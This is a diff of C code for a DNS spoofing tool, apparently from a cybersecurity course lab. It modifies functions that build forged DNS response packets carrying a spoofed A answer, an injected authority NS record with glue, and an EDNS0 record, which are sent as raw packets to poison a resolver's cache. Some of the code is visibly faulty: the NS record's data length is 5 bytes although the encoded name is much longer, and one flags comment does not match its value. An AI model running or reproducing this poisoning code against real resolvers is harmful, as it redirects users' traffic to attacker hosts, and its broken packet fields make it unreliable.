@@ -29,18 +29,18 @@ int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 #define DNS_PORT 53
 
 // Function to calculate checksum
-unsigned short calculate_checksum(unsigned short *buf, int len) {
-    unsigned long sum = 0;
-    for (; len > 1; len -= 2) {
-        sum += *buf++;
-    }
-    if (len == 1) {
-        sum += *(unsigned char *)buf;
-    }
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    return (unsigned short)(~sum);
-}
+// unsigned short calculate_checksum(unsigned short *buf, int len) {
+//     unsigned long sum = 0;
+//     for (; len > 1; len -= 2) {
+//         sum += *buf++;
+//     }
+//     if (len == 1) {
+//         sum += *(unsigned char *)buf;
+//     }
+//     sum = (sum >> 16) + (sum & 0xffff);
+//     sum += (sum >> 16);
+//     return (unsigned short)(~sum);
+// }
 
 void send_custom_ip_packet(const char *src_ip, const char *dest_ip, int src_port, int dest_port, uint8_t *dns_payload, int dns_payload_size) {
     char packet[BUFFER_SIZE];
@@ -138,8 +138,21 @@ void print_dns_payload(const uint8_t *payload, int size) {
     }
     printf("\n");
 }
+// Function to calculate checksum
+unsigned short calculate_checksum(unsigned short *buf, int len) {
+    unsigned long sum = 0;
+    for (; len > 1; len -= 2) {
+        sum += *buf++;
+    }
+    if (len == 1) {
+        sum += *(unsigned char *)buf;
+    }
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
 
-// Function to encode a domain name into DNS format
+// Encode a domain name into DNS wire format
 void encode_domain_name(uint8_t *dns, const char *host) {
     int lock = 0;
     strcat((char *)dns, ".");
@@ -155,18 +168,18 @@ void encode_domain_name(uint8_t *dns, const char *host) {
     *dns++ = '\0';
 }
 
-// Function to build a DNS query payload
-int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint16_t qtype) {
+// Function to build the DNS response payload
+int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     uint8_t *ptr = buffer;
 
     // DNS Header (12 bytes)
-    uint16_t flags = htons(0x8180); // Standard response 
-    uint16_t q_count = htons(1);   // One question
-    uint16_t ans_count = htons(1); // One answer
-    uint16_t auth_count = 0;       // No authority records
-    uint16_t add_count = 0;        // No additional records
+    uint16_t flags = htons(0x8410); // Standard response, No error, Recursion Available
+    uint16_t q_count = htons(1);    // 1 Question
+    uint16_t ans_count = htons(1);  // 1 Answer
+    uint16_t auth_count = htons(1); // 1 Authority Record
+    uint16_t add_count = htons(2);  // 2 Additional Records
 
-    *(uint16_t *)ptr = htons(txid); // Transaction ID
+    *(uint16_t *)ptr = htons(txid); // Transaction ID (matches query)
     ptr += 2;
     *(uint16_t *)ptr = flags;       // Flags
     ptr += 2;
@@ -179,30 +192,72 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint
     *(uint16_t *)ptr = add_count;   // Additional RRs
     ptr += 2;
 
-    // Encode the domain name for the question section
+    // DNS Question Section
     encode_domain_name(ptr, hostname);
     ptr += strlen((const char *)ptr) + 1;
-
-    *(uint16_t *)ptr = htons(qtype); // Query type (A = 1)
+    *(uint16_t *)ptr = htons(1);  // Type A
     ptr += 2;
-    *(uint16_t *)ptr = htons(1);     // Query class (IN = 1)
+    *(uint16_t *)ptr = htons(1);  // Class IN
     ptr += 2;
 
     // DNS Answer Section
-    *(uint16_t *)ptr = htons(0xc00c); // Pointer to the domain name (fixing the malformed pointer)
+    *(uint16_t *)ptr = htons(0xc00c); // Pointer to query name
     ptr += 2;
     *(uint16_t *)ptr = htons(1);      // Type A
     ptr += 2;
     *(uint16_t *)ptr = htons(1);      // Class IN
     ptr += 2;
-    *(uint32_t *)ptr = htonl(300);    // TTL (300 seconds)
+    *(uint32_t *)ptr = htonl(600);    // TTL (10 minutes)
     ptr += 4;
-    *(uint16_t *)ptr = htons(4);      // Data length (IPv4 = 4 bytes)
+    *(uint16_t *)ptr = htons(4);      // Data length (4 bytes)
     ptr += 2;
-    *(uint32_t *)ptr = inet_addr("6.6.6.6"); // Resolved IP address
+    *(uint32_t *)ptr = inet_addr("192.168.1.101"); // Resolved IP
     ptr += 4;
 
-    return ptr - buffer; // Return the total size of the DNS payload
+    // Authority Section (NS record)
+    encode_domain_name(ptr, "cybercourse.com");
+    ptr += strlen((const char *)ptr) + 1;
+    *(uint16_t *)ptr = htons(2);  // Type NS
+    ptr += 2;
+    *(uint16_t *)ptr = htons(1);  // Class IN
+    ptr += 2;
+    *(uint32_t *)ptr = htonl(600); // TTL
+    ptr += 4;
+    *(uint16_t *)ptr = htons(5);  // Data length (5 bytes)
+    ptr += 2;
+    encode_domain_name(ptr, "ns.cybercourse.com");
+    ptr += strlen((const char *)ptr) + 1;
+
+    // Additional Record (NS A Record)
+    encode_domain_name(ptr, "ns.cybercourse.com");
+    ptr += strlen((const char *)ptr) + 1;
+    *(uint16_t *)ptr = htons(1);  // Type A
+    ptr += 2;
+    *(uint16_t *)ptr = htons(1);  // Class IN
+    ptr += 2;
+    *(uint32_t *)ptr = htonl(600); // TTL
+    ptr += 4;
+    *(uint16_t *)ptr = htons(4);  // Data length
+    ptr += 2;
+    *(uint32_t *)ptr = inet_addr("192.168.1.204"); // NS IP
+    ptr += 4;
+
+    // EDNS0 (OPT Record)
+    *ptr++ = 0; // Root
+    *(uint16_t *)ptr = htons(41);  // Type OPT
+    ptr += 2;
+    *(uint16_t *)ptr = htons(4096); // UDP Payload size
+    ptr += 2;
+    *(uint8_t *)ptr = 0; // Extended RCODE
+    ptr += 1;
+    *(uint8_t *)ptr = 0; // EDNS0 version
+    ptr += 1;
+    *(uint16_t *)ptr = htons(0x8000); // DNSSEC OK bit
+    ptr += 2;
+    *(uint16_t *)ptr = htons(0); // No data
+    ptr += 2;
+
+    return ptr - buffer; // Return the total payload size
 }
 
 int full_send_spoofed_dns(uint txid, uint source_port) {
@@ -212,7 +267,7 @@ int full_send_spoofed_dns(uint txid, uint source_port) {
     int dest_port = source_port;                    // DNS port
 
     uint8_t dns_payload[BUFFER_SIZE];
-    int dns_payload_size = build_dns_payload(dns_payload, "www.example.cybercourse.com", txid, 1); // Query for A record
+    int dns_payload_size = build_dns_payload(dns_payload, "www.example.cybercourse.com", txid); // Query for A record
     print_dns_payload(dns_payload, dns_payload_size);
     send_custom_ip_packet(src_ip, dest_ip, src_port, dest_port, dns_payload, dns_payload_size);
 
